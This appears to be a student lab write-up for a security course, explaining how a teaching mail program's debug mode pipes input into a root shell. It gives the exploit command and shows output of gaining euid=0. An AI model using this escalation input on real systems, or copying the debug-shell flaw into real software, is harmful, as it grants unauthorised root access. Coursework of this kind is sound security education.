Yixuan Wang(yixua003) Qicheng Shi(shixx752) Ruoyan Kong (kong0135)

1. What mistakes in the source code bcmta.c make the exploit possible?
The debug mode will reset the rcpt.type as RCPT_ROOTSHELL. If the type is RCPT_ROOTSELL, it will run the following part: 	
if (type == RCPT_ROOTSHELL) {
	    mbox_fp = popen("/bin/sh", "w");

where it will execute the msg_lines (which we input /bin/rootshell).

2. explain how you constructed your inputs
Our input (echo -e "/bin/rootshell\n." && cat)| bcmta -d -f student -t test@localhost will invoke the debug mode.
-t test@localhost let the program recognize the address
test is because the debug mode requres it sent to test
-f let the program recognize the user
-d debug mode
echo -e "/bin/rootshell\n." && cat input 
/bin/rootshell
.
into the stream

3. Explain step-by-step what happens when an ordinary user runs exploit.sh.
The program entered into the debug mode.
Execute /bin/sh /bin/rootshell
Then the screen output:

student@xenial64s:~$ cd 5271_assignment/
student@xenial64s:~/5271_assignment$ ls
bcmta.c  exploit.sh  README.md
student@xenial64s:~/5271_assignment$ ./exploit.sh 
Enter message text followed by a period on its own line
Reopening stdin to /dev/tty: success.
uid=1001(student) euid=0(root) gid=1001(student) egid=1001(student)
Congratulations, you're root. Here's your shell:


